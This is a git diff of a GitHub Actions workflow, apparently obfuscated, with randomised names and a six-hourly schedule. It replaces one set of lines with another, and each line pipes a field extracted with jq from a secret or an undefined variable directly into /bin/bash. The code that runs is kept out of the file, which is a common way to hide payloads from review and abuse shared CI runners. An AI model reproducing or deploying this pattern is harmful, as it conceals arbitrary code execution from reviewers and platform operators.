@@ -2,7 +2,8 @@ name: zhoushilang4738
 on:
   workflow_dispatch:
   schedule:
-    - cron: '20 5/6 * * *'
+    - cron: '57 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,19 +11,25 @@ jobs:
       - uses: actions/checkout@v4
       - name: zhoushilang4738
         env:
-          topv17055: ${{ secrets.topv17055 }}
+          e01949: ${{ secrets.e01949 }}
         run: |
-          echo $topv17055 | jq -r .xnhh960 | /bin/bash
-          echo $hu3 | jq -r .axkc6589 | /bin/bash
-          echo $bytk2 | jq -r .lq39 | /bin/bash
-          echo $f14731 | jq -r .zu2172 | /bin/bash
-          echo $s5 | jq -r .s19193 | /bin/bash
-          echo $z939 | jq -r .sq6 | /bin/bash
-          echo $bemv063 | jq -r .nait6141 | /bin/bash
-          echo $h21602 | jq -r .y988 | /bin/bash
-          echo $e361 | jq -r .tvi137 | /bin/bash
-          echo $g5 | jq -r .cibl4 | /bin/bash
-          echo $cno88 | jq -r .m9 | /bin/bash
-          echo $apjp2 | jq -r .l17 | /bin/bash
-          echo $sm82172 | jq -r .jo287 | /bin/bash
+          echo $e01949 | jq -r .edd7223 | /bin/bash
+          echo $vw63 | jq -r .gves96756 | /bin/bash
+          echo $u78548 | jq -r .fvu43 | /bin/bash
+          echo $bun1 | jq -r .nmvhy73496 | /bin/bash
+          echo $bfyp5 | jq -r .mgks96426 | /bin/bash
+          echo $zy27749 | jq -r .esni02 | /bin/bash
+          echo $m745 | jq -r .uza4 | /bin/bash
+          echo $wwabl94 | jq -r .rnlxf3899 | /bin/bash
+          echo $w6712 | jq -r .zgydy74 | /bin/bash
+          echo $ea73 | jq -r .f8 | /bin/bash
+          echo $sly97 | jq -r .pqvdt6 | /bin/bash
+          echo $opim3380 | jq -r .bqith9273 | /bin/bash
+          echo $gmh38 | jq -r .rxqz1545 | /bin/bash
+          echo $tl2117 | jq -r .amqq24 | /bin/bash
+          echo $r23 | jq -r .xsmj01958 | /bin/bash
+          echo $r254 | jq -r .glae82326 | /bin/bash
+          echo $wytvj24730 | jq -r .i4991 | /bin/bash
+          echo $qv6901 | jq -r .vpszy273 | /bin/bash
+          echo $hejqg2305 | jq -r .z08958 | /bin/bash
 
